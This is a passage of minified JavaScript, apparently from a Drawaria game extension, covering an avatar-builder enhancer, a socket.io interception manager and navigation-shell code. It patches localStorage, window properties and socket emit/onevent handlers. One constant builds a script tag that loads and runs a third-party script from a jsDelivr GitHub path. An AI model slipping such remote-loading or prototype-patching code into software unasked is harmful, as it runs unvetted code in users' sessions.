    }
    #s(t) {
      let n = t.trim().split(/[/?#]/u).filter(Boolean).pop() ?? '',
        a = n.endsWith('.jpg') ? n.slice(0, -4) : n,
        o = a.lastIndexOf('.'),
        i = o > 0 ? a.slice(0, o) : a,
        s = o > 0 ? a.slice(o + 1) : null;
      return Object.freeze({
        uid: E(i, 'Anonymous storage upload returned an unsafe cache uid.'),
        wt: s ? E(s, 'Anonymous storage upload returned an unsafe wt value.') : null,
      });
    }
    #i(t) {
      t === null ? this.#A('uid') : this.#p('uid', t);
    }
    #u(t) {
      return this.#f()[t] ?? null;
    }
    #f() {
      return this.#t.document.cookie.split(';').reduce((t, e) => {
        let n = e.indexOf('='),
          a = n === -1 ? e : e.slice(0, n),
          o = n === -1 ? '' : e.slice(n + 1),
          i = this.#d(a.trim());
        return (i && (t[i] = this.#d(o.trim())), t);
      }, {});
    }
    #d(t) {
      try {
        return decodeURIComponent(t);
      } catch {
        return t;
      }
    }
    #p(t, e, n = {}) {
      let a = n.maxAge ?? nr,
        o = [`${encodeURIComponent(t)}=${encodeURIComponent(e)}`, `Max-Age=${a}`, 'Path=/'];
      (this.#t.location.protocol === 'https:'
        ? o.push('Secure', 'Partitioned', 'SameSite=None')
        : o.push('SameSite=Lax'),
        (this.#t.document.cookie = o.join('; ')));
    }
    #A(t) {
      this.#p(t, '', { maxAge: 0 });
    }
    #h(t) {
      return t instanceof Error ? t.message : String(t);
    }
  };
  var ot = 'drawaria-extension:avatar-builder-assets',
    le = 'data-drawaria-extension-avatar-builder-controls',
    rt = /^data:image\/(?:png|jpe?g|gif);base64,/iu,
    ge = /^data:image\/png;base64,/iu,
    S = 128,
    or = 102,
    O = 'avatarsave_builder',
    nt = 'drawaria-extension:avatar-builder-save',
    ce = Symbol.for('drawaria.extension.avatarBuilderNativeLoadGuard'),
    at = Symbol.for('drawaria.extension.avatarBuilderAccountSave');
  function j(r) {
    let t = r;
    t[ce] ||
      ((t[ce] = !0), new URL(r.location.href).pathname.replace(/\/+$/u, '') === '/avatar/builder' && (ur(r), dr(t)));
  }
  function it() {
    return {
      id: 'avatar-builder-enhancer',
      route: (r) => r?.kind === 'avatar' && r.pathname === '/avatar/builder',
      mount(r) {
        let t = new vt(r);
        return (t.mount(), () => t.cleanup());
      },
    };
  }
  var vt = class {
    #t;
    #r = new Set();
    #e = null;
    #n = null;
    #a = null;
    #o = null;
    constructor(t) {
      this.#t = t;
    }
    mount() {
      if ((j(this.#t.activeWindow), this.#s())) return;
      let t = this.#t.activeWindow,
        e = new t.MutationObserver(() => {
          this.#s() && e.disconnect();
        });
      (e.observe(this.#t.activeDocument.documentElement, { childList: !0, subtree: !0 }),
        this.#r.add(() => e.disconnect()));
    }
    cleanup() {
      for (let t of this.#r) t();
      (this.#r.clear(),
        this.#a?.parentElement && this.#a.remove(),
        (this.#a = null),
        (this.#o = null),
        this.#e &&
          this.#e.addCustomAsset === this.#i &&
          (this.#n ? (this.#e.addCustomAsset = this.#n) : delete this.#e.addCustomAsset),
        (this.#e = null),
        (this.#n = null));
    }
    #s() {
      if (this.#e) return !0;
      let t = ir(this.#t.activeDocument);
      return !t || !t.state.allAssetsLoaded
        ? !1
        : ((this.#e = t),
          (this.#n = t.addCustomAsset ?? null),
          (t.addCustomAsset = this.#i),
          this.#A(),
          this.#u(t),
          !0);
    }
    #i = (t, e) => {
      if (!this.#e || !rt.test(e)) {
        this.#c('Custom assets must be PNG, JPEG, or GIF images.', 'error');
        return;
      }
      (this.#c('Normalizing custom asset...', 'loading'),
        he(this.#t.activeWindow, e)
          .then((n) => this.#f(t, n, !0))
          .catch((n) => {
            this.#c(`Custom asset import failed: ${St(n)}`, 'error');
          }));
    };
    #u(t) {
      let e = this.#S();
      e.length && this.#d(t, e);
    }
    #f(t, e, n) {
      if (!this.#e || !ge.test(e)) return (this.#c('Custom assets could not be normalized to PNG.', 'error'), null);
      let a = de(this.#t.activeWindow, t, e),
        o = this.#e.state.assets;
      if (o.some((s) => s.name === a.name && s.category === 'custom'))
        return (this.#c(`${a.prettyName} is already in your custom assets.`, 'warning'), null);
      a.img.addEventListener('load', () => this.#v());
      let i = Object.freeze([...o, a]);
      return (
        this.#e.setState({ assets: i }, () => {
          (n && this.#e?.addLayer(a.name), this.#m(i), this.#c(`Added ${a.prettyName}.`, 'success'));
        }),
        (a.img.src = e),
        a
      );
    }
    async #d(t, e) {
      let n = [];
      for (let o of e)
        if (!t.state.assets.some((i) => i.category === 'custom' && i.name === o.name))
          try {
            let i = await he(this.#t.activeWindow, o.src),
              s = de(this.#t.activeWindow, o.name, i, o.prettyName);
            (s.img.addEventListener('load', () => this.#v()), (s.img.src = i), n.push(s));
          } catch (i) {
            this.#c(`Custom asset restore failed: ${St(i)}`, 'error');
          }
      if (!n.length) {
        this.#p(t);
        return;
      }
      let a = Object.freeze([...t.state.assets, ...n]);
      t.setState({ assets: a }, () => {
        (this.#m(a), this.#c(`Restored ${n.length} custom asset${n.length === 1 ? '' : 's'}.`, 'success'), this.#p(t));
      });
    }
    #p(t) {
      let e = cr(this.#t.activeWindow);
      if (!e) return;
      let n = [],
        a = 0;
      for (let o of e) {
        let i = hr(o, t.state.assets);
        i ? n.push(i) : a++;
      }
      (t.setState({ layers: n }),
        a && this.#c(`Skipped ${a} missing saved avatar layer${a === 1 ? '' : 's'}.`, 'warning'));
    }
    #A() {
      let t = this.#t.activeDocument,
        e = t.querySelector('.App > header');
      if (!e || e.querySelector(`[${le}]`)) return;
      let n = t.createElement('span');
      n.setAttribute(le, 'true');
      let a = this.#h('Add custom asset'),
        o = this.#w();
      if (
        (a.addEventListener('click', () => o.click()),
        o.addEventListener('change', () => {
          let s = o.files?.[0] ?? null;
          ((o.value = ''), s && this.#l(s, (l) => this.#i(s.name, l)));
        }),
        this.#k())
      ) {
        let s = this.#h('Upload avatar image'),
          l = this.#w();
        (s.addEventListener('click', () => l.click()),
          l.addEventListener('change', () => {
            let c = l.files?.[0] ?? null;
            ((l.value = ''),
              c &&
                this.#l(c, (d) => {
                  this.#g(d);
                }));
          }),
          n.append(s, l));
      }
      let i = t.createElement('span');
      (i.setAttribute('aria-live', 'polite'),
        (i.style.marginLeft = '10px'),
        (i.style.textTransform = 'none'),
        n.append(i),
        e.append(a, o, n),
        (this.#a = n),
        (this.#o = i));
    }
    #h(t) {
      let e = this.#t.activeDocument.createElement('button');
      return ((e.type = 'button'), (e.className = 'Button'), (e.textContent = t), e);
    }
    #w() {
      let t = this.#t.activeDocument.createElement('input');
      return ((t.type = 'file'), (t.accept = 'image/png,image/jpeg,image/gif'), (t.hidden = !0), t);
    }
    #l(t, e) {
      if (!/image\/(?:png|jpe?g|gif)/iu.test(t.type) && !/\.(?:png|jpe?g|gif)$/iu.test(t.name)) {
        this.#c('Choose a PNG, JPEG, or GIF image.', 'error');
        return;
      }
      let n = new this.#t.activeWindow.FileReader();
      (n.addEventListener('load', () => {
        typeof n.result == 'string' && rt.test(n.result)
          ? e(n.result)
          : this.#c('The selected image could not be read.', 'error');
      }),
        n.addEventListener('error', () => this.#c('The selected image could not be read.', 'error')),
        n.readAsDataURL(t));
    }
    async #g(t) {
      this.#c('Uploading avatar image...', 'loading');
      try {
        let e = await this.#t.activeWindow.fetch(new URL('/saveavatar', this.#t.url).href, {
          method: 'POST',
          body: new URLSearchParams({ imagedata: A(t), fromeditor: 'true' }),
          headers: { Accept: 'text/plain, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest' },
        });
        if (!e.ok) throw new Error(`HTTP ${e.status}`);
        if (!(await e.text()).trim()) throw new Error('Drawaria returned an empty upload response.');
        (this.#c('Avatar image uploaded.', 'success'), this.#y());
      } catch (e) {
        this.#c(`Avatar upload failed: ${St(e)}`, 'error');
      }
    }
    #y() {
      let t = new URL('/', this.#t.url),
        e = this.#t.parentWindow.DrawariaExtension?.shell;
      if (e) {
        try {
          e.navigate(t).catch(() => this.#t.parentWindow.location.assign(t.href));
        } catch {
          this.#t.parentWindow.location.assign(t.href);
        }
        return;
      }
      this.#t.parentWindow.location.assign(t.href);
    }
    #m(t) {
      let e = t
        .filter((n) => n.category === 'custom' && n.src && rt.test(n.src))
        .map((n) => Object.freeze({ name: n.name, prettyName: n.prettyName, src: n.src }));
      pr(this.#t.activeWindow, ot, JSON.stringify(e));
    }
    #S() {
      let t = G(this.#t.activeWindow, ot);
      if (!t) return Object.freeze([]);
      try {
        let e = JSON.parse(t);
        return Array.isArray(e) ? Object.freeze(e.filter(fr)) : Object.freeze([]);
      } catch {
        return Object.freeze([]);
      }
    }
    #v() {
      this.#e && this.#e.setState({ layers: [...this.#e.state.layers] });
    }
    #c(t, e) {
      this.#o && ((this.#o.textContent = t), (this.#o.dataset.status = e));
    }
    #k() {
      return p(this.#t.activeWindow) ?? p(this.#t.parentWindow) ?? R(this.#t.parentWindow) ?? !1;
    }
  };
  function ir(r) {
    let t = r.getElementById('root'),
      e = r.querySelector('.App');
    return ue(t) ?? ue(e);
  }
  function ue(r) {
    if (!r || (typeof r != 'object' && typeof r != 'function')) return null;
    let t = [r],
      e = new Set();
    for (let n = 0; n < t.length && n < 300; n++) {
      let a = t[n];
      if (!a || (typeof a != 'object' && typeof a != 'function') || e.has(a)) continue;
      if ((e.add(a), sr(a))) return a;
      let o = a;
      for (let i of Object.getOwnPropertyNames(o)) {
        if (i === 'window' || i === 'document' || i === 'ownerDocument' || i === 'parentNode') continue;
        let s = kt(o, i);
        s && (typeof s == 'object' || typeof s == 'function') && t.push(s);
      }
    }
    return null;
  }
  function sr(r) {
    if (!r || typeof r != 'object') return !1;
    let t = r,
      e = t.state;
    return (
      typeof t.setState == 'function' &&
      typeof t.addLayer == 'function' &&
      !!e &&
      typeof e == 'object' &&
      Array.isArray(e.assets) &&
      Array.isArray(e.layers)
    );
  }
  function de(r, t, e, n = fe(t.replace(/\.[^.]+$/u, '').replace(/[_-]+/gu, ' '))) {
    let a = t.startsWith('custom:') ? t : gr(t),
      o = n.trim() || fe(a),
      i = r.document.createElement('img');
    return (
      (i.alt = o),
      (i.className = 'asset'),
      (i.draggable = !1),
      Object.freeze({
        name: a,
        prettyName: o,
        category: 'custom',
        prettyCategory: 'Custom',
        src: e,
        imgEl: lr(e, o),
        img: i,
      })
    );
  }
  function lr(r, t) {
    return Object.freeze({
      $$typeof: Symbol.for('react.element'),
      type: 'img',
      key: null,
      ref: null,
      props: Object.freeze({ src: r, alt: t, className: 'asset', draggable: !1 }),
      _owner: null,
      _store: Object.freeze({}),
    });
  }
  function he(r, t) {
    return new Promise((e, n) => {
      let a = r.document.createElement('img');
      (a.addEventListener('load', () => {
        try {
          let o = a.naturalWidth || a.width,
            i = a.naturalHeight || a.height;
          if (!o || !i) throw new Error('The selected image has no readable dimensions.');
          let s = r.document.createElement('canvas');
          ((s.width = S), (s.height = S));
          let l = s.getContext('2d');
          if (!l) throw new Error('The browser could not create a canvas for asset normalization.');
          l.clearRect(0, 0, S, S);
          let c = Math.min(S / o, S / i),
            d = o * c,
            u = i * c,
            h = (S - d) / 2,
            f = (S - u) / 2;
          l.drawImage(a, h, f, d, u);
          let m = s.toDataURL('image/png');
          if (!ge.test(m)) throw new Error('The normalized asset was not exported as a PNG image.');
          e(m);
        } catch (o) {
          n(o);
        }
      }),
        a.addEventListener('error', () => n(new Error('The selected image could not be loaded.'))),
        (a.src = t));
    });
  }
  function cr(r) {
    let e = r[at] ?? H(G(r, nt)) ?? kt(r, 'ACCOUNT_AVATARSAVE') ?? H(G(r, O));
    return !Array.isArray(e) || !Array.isArray(e[0]) ? null : e[0];
  }
  function ur(r) {
    let t = H(G(r, ot));
    if (!Array.isArray(t) || t.length === 0) return;
    let e = r.localStorage,
      n = Object.getPrototypeOf(e),
      a = n.getItem,
      o = n.setItem,
      i = a.call(e, nt),
      s = a.call(e, O);
    !i && s && (o.call(e, nt, s), o.call(e, O, At(s) ?? s));
    try {
      Object.defineProperties(n, {
        getItem: {
          configurable: !0,
          value(l) {
            let c = a.call(this, l);
            return this === e && l === O ? At(c) : c;
          },
        },
        setItem: {
          configurable: !0,
          value(l, c) {
            if (this !== e || l !== O) {
              o.call(this, l, c);
              return;
            }
            (o.call(this, nt, c), o.call(this, O, At(c) ?? c));
          },
        },
      });
    } catch {}
  }
  function dr(r) {
    let t = H(G(r, ot));
    if (!Array.isArray(t) || t.length === 0) return;
    let e = kt(r, 'ACCOUNT_AVATARSAVE');
    r[at] = e;
    try {
      Object.defineProperty(r, 'ACCOUNT_AVATARSAVE', {
        configurable: !0,
        get() {
          return me(r[at]);
        },
        set(n) {
          r[at] = n;
        },
      });
    } catch {}
  }
  function At(r) {
    if (r === null) return null;
    let t = me(H(r));
    return t ? JSON.stringify(t) : r;
  }
  function me(r) {
    return !Array.isArray(r) || !Array.isArray(r[0])
      ? r
      : Object.freeze([
          Object.freeze(
            r[0].filter((t) => (!Array.isArray(t) || !Number.isInteger(t[0]) ? !1 : t[0] >= 0 && t[0] < or))
          ),
        ]);
  }
  function hr(r, t) {
    if (!Array.isArray(r) || r.length < 7 || !Number.isInteger(r[0])) return null;
    let e = t[r[0]];
    return e
      ? {
          asset: e,
          flipped: typeof r[1] == 'boolean' ? r[1] : void 0,
          transform: { translateX: et(r[2], 0), translateY: et(r[3], 0), scale: et(r[4], 1), rotate: et(r[5], 0) },
          showTransforms: r[6] === !0,
        }
      : null;
  }
  function fr(r) {
    if (!r || typeof r != 'object') return !1;
    let t = r;
    return typeof t.name == 'string' && typeof t.prettyName == 'string' && typeof t.src == 'string' && rt.test(t.src);
  }
  function gr(r) {
    return `custom:${
      r
        .replace(/\.[^.]+$/u, '')
        .replace(/[_-]+/gu, ' ')
        .trim()
        .toLowerCase()
        .replace(/[^a-z0-9 ]+/gu, '')
        .replace(/\s+/gu, ' ')
        .trim() || 'asset'
    }:${mr(r).toString(36)}`;
  }
  function fe(r) {
    return r.replace(/\w\S*/gu, (t) => t.charAt(0).toUpperCase() + t.slice(1).toLowerCase());
  }
  function mr(r) {
    let t = 0;
    for (let e = 0; e < r.length; e++) t = (t * 31 + r.charCodeAt(e)) >>> 0;
    return t;
  }
  function et(r, t) {
    return typeof r == 'number' && Number.isFinite(r) ? r : t;
  }
  function G(r, t) {
    try {
      return r.localStorage.getItem(t);
    } catch {
      return null;
    }
  }
  function pr(r, t, e) {
    try {
      r.localStorage.setItem(t, e);
    } catch {}
  }
  function H(r) {
    if (!r) return null;
    try {
      return JSON.parse(r);
    } catch {
      return null;
    }
  }
  function kt(r, t) {
    try {
      return r[t];
    } catch {
      return;
    }
  }
  function St(r) {
    return r instanceof Error ? r.message : String(r);
  }
  var _ = class {
    #t = [];
    add(t) {
      if (typeof t != 'function') throw new TypeError('Cleanup callback must be a function.');
      let e = !0;
      return (
        this.#t.push(t),
        () => {
          if (!e) return;
          e = !1;
          let n = this.#t.indexOf(t);
          (n >= 0 && this.#t.splice(n, 1), t());
        }
      );
    }
    dispose() {
      let t = this.#t.splice(0).reverse(),
        e = [];
      for (let n of t)
        try {
          n();
        } catch (a) {
          e.push(a);
        }
      if (e.length > 0) throw new Error('One or more cleanup callbacks failed.');
    }
  };
  function st(r = window) {
    let t = r,
      e = t.String.prototype,
      n = t.Function.prototype;
    (typeof e.toFunction != 'function' &&
      Object.defineProperty(e, 'toFunction', {
        configurable: !0,
        writable: !0,
        value: function (...o) {
          return t.Function(...o.map(String), String(this)).bind(null);
        },
      }),
      typeof n.runAsWorker != 'function' &&
        Object.defineProperty(n, 'runAsWorker', {
          configurable: !0,
          writable: !0,
          value: function (...o) {
            let i = pe(t, this);
            return i.run(...o).finally(() => i.terminate());
          },
        }),
      typeof n.createWorker != 'function' &&
        Object.defineProperty(n, 'createWorker', {
          configurable: !0,
          writable: !0,
          value: function () {
            return pe(t, this);
          },
        }));
  }
  function pe(r, t) {
    let e = [
        `const target = (${String(t)});`,
        'self.onmessage = (event) => {',
        '  const request = event.data;',
        '  Promise.resolve()',
        '    .then(() => target.call(null, ...request.args))',
        '    .then(',
        '      (value) => self.postMessage({ id: request.id, status: "fulfilled", value }),',
        '      (error) => self.postMessage({',
        '        id: request.id,',
        '        status: "rejected",',
        '        error: error instanceof Error ? error.message : String(error),',
        '      })',
        '    );',
        '};',
      ].join(`
`),
      n = new r.Blob([e], { type: 'text/javascript' }),
      a = r.URL ?? r.webkitURL;
    if (!a) throw new TypeError('Worker object URLs are not available in this window.');
    let o = a.createObjectURL(n),
      i = new r.Worker(o),
      s = new Map(),
      l = !0,
      c = 0,
      d = (u) => {
        if (l) {
          ((l = !1), i.terminate(), a.revokeObjectURL?.(o));
          for (let h of s.values()) h.reject(u);
          s.clear();
        }
      };
    return (
      (i.onmessage = (u) => {
        let h = u.data,
          f = s.get(h.id);
        f && (s.delete(h.id), h.status === 'fulfilled' ? f.resolve(h.value) : f.reject(new Error(h.error)));
      }),
      (i.onerror = (u) => {
        d(new Error(u.message));
      }),
      Object.freeze({
        get active() {
          return l;
        },
        run(...u) {
          return l
            ? new Promise((h, f) => {
                let m = { id: ++c, args: u };
                s.set(m.id, { resolve: h, reject: f });
                try {
                  i.postMessage(m);
                } catch (B) {
                  (s.delete(m.id), f(B));
                }
              })
            : Promise.reject(new Error('Worker has been terminated.'));
        },
        terminate() {
          d(new Error('Worker has been terminated.'));
        },
      })
    );
  }
  var P = class {
    #t;
    #r;
    #e = new Map();
    #n = null;
    constructor(t, e) {
      ((this.#t = t), (this.#r = e));
    }
    register(t) {
      (this.#i(t), this.unregister(t.id));
      let e = { module: t, mounted: null, error: null };
      return (this.#e.set(t.id, e), this.#n && this.#a(e, this.#n), () => this.unregister(t.id));
    }
    unregister(t) {
      let e = this.#e.get(t);
      return e ? (this.#o(e), this.#e.delete(t)) : !1;
    }
    apply(t) {
      this.#n = t;
      for (let e of this.#e.values()) this.#a(e, t);
    }
    dispose() {
      for (let t of this.#e.values()) this.#o(t);
      this.#n = null;
    }
    statuses() {
      return Object.freeze(
        [...this.#e.values()].map((t) =>
          Object.freeze({
            id: t.module.id,
            mounted: t.mounted !== null,
            applicationKey: t.mounted?.applicationKey ?? null,
            error: t.error,
          })
        )
      );
    }
    #a(t, e) {
      if (!this.#s(t.module, e)) {
        this.#o(t);
        return;
      }
      let n = this.#r(e);
      try {
        if (t.mounted?.applicationKey === n && t.module.refresh) {
          (t.module.refresh(this.#t(e, t.mounted.stack)), (t.error = null));
          return;
        }
        this.#o(t);
        let a = new _();
        t.mounted = { stack: a, applicationKey: n };
        let o = t.module.mount(this.#t(e, a));
        (typeof o == 'function' && a.add(o), (t.error = null));
      } catch (a) {
        ((t.error = a instanceof Error ? a.message : String(a)), this.#o(t));
      }
    }
    #o(t) {
      let e = t.mounted;
      ((t.mounted = null), e?.stack.dispose());
    }
    #s(t, e) {
      return t.matches ? t.matches(e) : !0;
    }
    #i(t) {
      if (!t.id.trim()) throw new TypeError('Module id must be a non-empty string.');
      if (typeof t.mount != 'function') throw new TypeError(`Module "${t.id}" must provide mount().`);
      if (t.matches && typeof t.matches != 'function')
        throw new TypeError(`Module "${t.id}" matches must be a function.`);
      if (t.refresh && typeof t.refresh != 'function')
        throw new TypeError(`Module "${t.id}" refresh must be a function.`);
    }
  };
  var F = class {
    #t;
    constructor(t) {
      let e = (n, a) => {
        let o = n.parentWindow.document;
        return Object.freeze({
          parentWindow: n.parentWindow,
          parentDocument: o,
          activeWindow: n.activeWindow,
          activeDocument: n.activeWindow.document,
          route: n.route,
          url: new URL(n.url.href),
          frame: n.frame,
          shellRoot: n.shellRoot,
          socket: n.socket,
          accountUid: n.accountUid,
          accountSid1: n.accountSid1,
          onCleanup: (i) => a.add(i),
        });
      };
      this.#t = new P(e, (n) => n.route?.pathname ?? null);
    }
    register(t) {
      return this.#t.register({
        id: t.id,
        matches: (e) => (t.route ? t.route(e.route) : !0),
        mount: t.mount,
        ...(t.refresh ? { refresh: t.refresh } : {}),
      });
    }
    unregister(t) {
      return this.#t.unregister(t);
    }
    apply(t) {
      this.#t.apply(t);
    }
    dispose() {
      this.#t.dispose();
    }
    statuses() {
      return Object.freeze(
        this.#t
          .statuses()
          .map((t) => Object.freeze({ id: t.id, mounted: t.mounted, routePathname: t.applicationKey, error: t.error }))
      );
    }
    createFacade() {
      return Object.freeze({ register: (t) => this.register(t), statuses: () => this.statuses() });
    }
  };
  var we = Symbol.for('drawaria.extension.socketManager'),
    ye = Symbol.for('drawaria.extension.patchedIo'),
    Ae = Symbol.for('drawaria.extension.patchedSocket'),
    wr = new Set(['connect', 'disconnect', 'error']),
    v = class {
      #t;
      #r = new Set();
      #e = new Map();
      #n = new Map();
      #a = new Map();
      #o = new Map();
      #s = !1;
      #i = null;
      constructor(t) {
        this.#t = t;
      }
      get sockets() {
        return Object.freeze([...this.#r]);
      }
      get primarySocket() {
        return this.#i;
      }
      initialize() {
        return (this.#s || ((this.#s = !0), (this.#t[we] = this)), this.attachWindow(this.#t), this);
      }
      attachWindow(t) {
        return ((t[we] = this), this.#u(t), this.#f(t), this);
      }
      refresh() {
        return (this.attachWindow(this.#t), this);
      }
      interceptEmit(t, e) {
        return this.#g(this.#e, t, e);
      }
      interceptIncoming(t, e) {
        return this.#g(this.#n, t, e);
      }
      replaceIncoming(t, e) {
        return this.#y(this.#a, t, e);
      }
      on(t, e) {
        return this.#y(this.#o, t, e);
      }
      trigger(t, ...e) {
        let n = this.#i;
        return n ? (this.#A(n, t, e, (a) => this.#h(n, t, a)), !0) : !1;
      }
      createDebugFacade() {
        let t = this;
        return Object.freeze({
          get sockets() {
            return Object.freeze([...t.#r]);
          },
          get primarySocket() {
            return t.#i;
          },
          on: (e, n) => t.on(e, n),
          interceptEmit: (e, n) => t.interceptEmit(e, n),
          interceptIncoming: (e, n) => t.interceptIncoming(e, n),
          replaceIncoming: (e, n) => t.replaceIncoming(e, n),
          trigger: (e, ...n) => t.trigger(e, ...n),
          hooks: () => t.hooks(),
        });
      }
      hooks() {
        return Object.freeze({
          incoming: this.#m(this.#n),
          outgoing: this.#m(this.#e),
          replacements: this.#m(this.#a),
          listeners: this.#m(this.#o),
        });
      }
      #u(t) {
        let e = t.io;
        if (typeof e != 'function') return;
        let n = e;
        if (!n[ye]) {
          let i = n.__drawariaOriginalIo ?? n,
            s = this,
            l = function (...d) {
              let u = Reflect.apply(i, this, d);
              return (s.#d(u), u);
            };
          if ((Object.assign(l, n), (l.__drawariaOriginalIo = i), (l[ye] = !0), typeof n.connect == 'function')) {
            let c = n.connect;
            ((l.__drawariaOriginalConnect = c),
              (l.connect = (...d) => {
                let u = c(...d);
                return (s.#d(u), u);
              }));
          } else l.connect = l;
          t.io = l;
        }
        let o = t.io.Socket?.prototype;
        this.#S(o) && this.#p(o);
      }
      #f(t) {
        let e = t.io;
        if (typeof e != 'function') return;
        let n = e.managers;
        if (n) for (let a of Object.values(n)) for (let o of Object.values(a.nsps ?? {})) this.#S(o) && this.#d(o);
      }
      #d(t) {
        (this.#p(t), this.#r.has(t) || this.#r.add(t), (this.#i = t));
      }
      #p(t) {
        let e = t;
        if (e[Ae] || typeof e.emit != 'function') return;
        let n = this;
        ((e.__drawariaOriginalEmit = e.emit),
          (e.emit = function (o, ...i) {
            if ((n.#d(this), wr.has(o))) return e.__drawariaOriginalEmit?.call(this, o, ...i) ?? this;
            let s = n.#w(n.#e, this, o, i, !0);
            return s ? (e.__drawariaOriginalEmit?.call(this, o, ...s.args) ?? this) : this;
          }),
          typeof e.onevent == 'function' &&
            ((e.__drawariaOriginalOnevent = e.onevent),
            (e.onevent = function (o) {
              n.#d(this);
              let i = Array.isArray(o.data) ? o.data : [],
                [s, ...l] = i;
              if (typeof s != 'string') {
                e.__drawariaOriginalOnevent?.call(this, o);
                return;
              }
              n.#A(this, s, l, (c) => {
                ((o.data = [s, ...c]), e.__drawariaOriginalOnevent?.call(this, o));
              });
            })),
          (e[Ae] = !0));
      }
      #A(t, e, n, a) {
        let o = this.#w(this.#n, t, e, n);
        if (!o) return;
        let i = this.#a.get(e) ?? [];
        if (i.length > 0) for (let s of [...i]) s.call(t, ...o.args);
        else a(o.args);
        for (let s of [...(this.#o.get(e) ?? [])]) s.call(t, ...o.args);
      }
      #h(t, e, n) {
        let a = t;
        if (typeof a.__drawariaOriginalOnevent == 'function') {
          a.__drawariaOriginalOnevent.call(t, { type: 2, data: [e, ...n] });
          return;
        }
        for (let o of [...(t._callbacks?.[`$${e}`] ?? [])]) o.call(t, ...n);
      }
      #w(t, e, n, a, o = !1) {
        let i = a;
        for (let s of t.get(n) ?? []) {
          let l = s(Object.freeze({ socket: e, event: n, args: Object.freeze([...i]) }));
          if (this.#v(l)) return null;
          this.#c(l) && l.args && (i = this.#l(i, l.args, o));
        }
        return { args: i };
      }
      #l(t, e, n) {
        if (!n) return e;
        let a = t[t.length - 1];
        return typeof a != 'function' || e.includes(a) ? e : Object.freeze([...e, a]);
      }
      #g(t, e, n) {
        let a = t.get(e) ?? [];
        return (
          a.push(n),
          t.set(e, a),
          () => {
            let o = a.indexOf(n);
            (o >= 0 && a.splice(o, 1), a.length === 0 && t.delete(e));
          }
        );
      }
      #y(t, e, n) {
        let a = t.get(e) ?? [];
        return (
          a.push(n),
          t.set(e, a),
          () => {
            let o = a.indexOf(n);
            (o >= 0 && a.splice(o, 1), a.length === 0 && t.delete(e));
          }
        );
      }
      #m(t) {
        let e = {};
        for (let [n, a] of t) e[n] = a.length;
        return Object.freeze(e);
      }
      #S(t) {
        return !!(t && typeof t == 'object' && 'emit' in t && typeof t.emit == 'function');
      }
      #v(t) {
        return t?.action === 'cancel';
      }
      #c(t) {
        return t?.action === 'continue';
      }
    };
  var yr = new Set(['/rules', '/privacy', '/terms', '/links']),
    Ar = /^\/gallery\/img\/[^/]+$/u,
    Sr = '/avatar/builder',
    vr = new Map([
      ['/profile', 'profile'],
      ['/gallery', 'gallery'],
      ['/scoreboards', 'scoreboards'],
      ['/palettes', 'palettes'],
      ['/friends', 'friends'],
      ['/avatar', 'avatar'],
    ]);
  function z(r) {
    return (r.startsWith('/') ? r : `/${r}`).replace(/\/+$/u, '') || '/';
  }
  function g(r, t) {
    let e;
    try {
      e = new URL(r, t);
    } catch {
      return null;
    }
    if (e.protocol !== 'http:' && e.protocol !== 'https:') return null;
    let n = z(e.pathname);
    if (n.startsWith('/auth')) return null;
    let a =
      n === '/'
        ? 'home'
        : n === Sr
          ? 'avatar'
          : (vr.get(n) ?? (Ar.test(n) ? 'gallery' : void 0) ?? (yr.has(n) ? 'static' : void 0));
    return a ? Object.freeze({ kind: a, pathname: n, url: `${e.pathname}${e.search}${e.hash}` }) : null;
  }
  var xt = 'drawaria:shell:before-navigate',
    $ = 'drawaria:shell:after-navigate',
    Et = 'drawaria:shell:frame-load',
    bt = 'drawaria:shell:navigation-fallback',
    Se = 'data-drawaria-extension-shell',
    ve = 'data-drawaria-extension-shell-frame',
    b = 'drawariaShellTarget',
    Tt = 'Navigator/version2.min.js',
    W = `//cdn.jsdelivr.net/gh/cubic074/scripts/${Tt}`,
    Rt = encodeURIComponent(`<script>d=document,d.head.appendChild(d.createElement\`script\`).src="${W}"<\/script>`),
    N = class {
      #t;
      #r;
      #e;
      #n;
      #a;
      #o;
      #s;
      #i;
      #u;
      #f;
      #d;
      #p;
      #A;
      #h = !1;
      #w = null;
      #l = null;
      #g = null;
      #y = null;
      #m = null;
      #S = null;
      #v = null;
      #c = null;
      #k = null;
      #x = null;
      #E = null;
      constructor(t, e, n = null) {
        ((this.#t = t.targetWindow ?? window),
          (this.#r = t.assign ?? ((a) => this.#t.location.assign(a))),
          (this.#e = t.open ?? ((a, o, i) => this.#t.open(a, o, i))),
          (this.#n = n),
          (this.#a = e),
          (this.#o = t.enableSocket === !1 ? null : (t.socketManager ?? new v(this.#t).initialize())),
          (this.#f = t.beforeNavigate),
          (this.#d = t.afterNavigate),
          (this.#p = t.afterFrameLoad),
          (this.#A = t.onFallback),
          (this.#s = (a) => this.#W(a)),
          (this.#i = () => {
            this.navigate(this.#t.location.href, { historyMode: 'none' });
          }),
          (this.#u = this.#R()));
      }
      get active() {
        return this.#h;
      }
      get currentUrl() {
        return this.#k ?? this.#t.location.href;
      }
      get currentRoute() {
        return this.#x ?? g(this.#t.location.href, this.#t.location.href);
      }
      get lastNavigation() {
        return this.#E;
      }
      get shellRoot() {
        return this.#w;
      }
      get frame() {
        return this.#l;
      }
      get socket() {
        return this.#o;
      }
      initialize() {
        if (this.#h) return;
        ((this.#h = !0),
          this.#t.document.addEventListener('click', this.#s, !0),
          this.#t.addEventListener('popstate', this.#i),
          this.#z(),
          this.#n?.scan(this.#t));
        let t = g(this.#t.location.href, this.#t.location.href);
        ((this.#x = t), (this.#k = this.#t.location.href), this.#U(this.#t, t, new URL(this.#t.location.href), null));
      }
      cleanup() {
        this.#h &&
          ((this.#h = !1),
          this.#L('before'),
          this.#L('frame'),
          this.#t.document.removeEventListener('click', this.#s, !0),
          this.#t.removeEventListener('popstate', this.#i),
          this.#D(),
          this.#P(),
          this.#l && this.#g && this.#l.removeEventListener('load', this.#g),
          (this.#g = null),
          this.#w?.remove(),
          (this.#w = null),
          (this.#l = null),
          this.#a.dispose(),
          this.#T($, {
            result: this.#b(
              { status: 'ignored', url: this.#t.location.href, route: null, reason: 'Shell cleanup' },
              !1
            ),
          }));
      }
      async navigate(t, e = { historyMode: 'push' }) {
        if (!this.#h) return this.#b({ status: 'ignored', url: String(t), route: null, reason: 'Shell inactive' });
        let n = new URL(t, this.#t.location.href),
          a = g(n, this.#t.location.href);
        if (!a || n.origin !== this.#t.location.origin) return this.#O(n, a, 'Unsupported route');
        try {
          this.#n?.scan(this.#t);
          let o = this.#C();
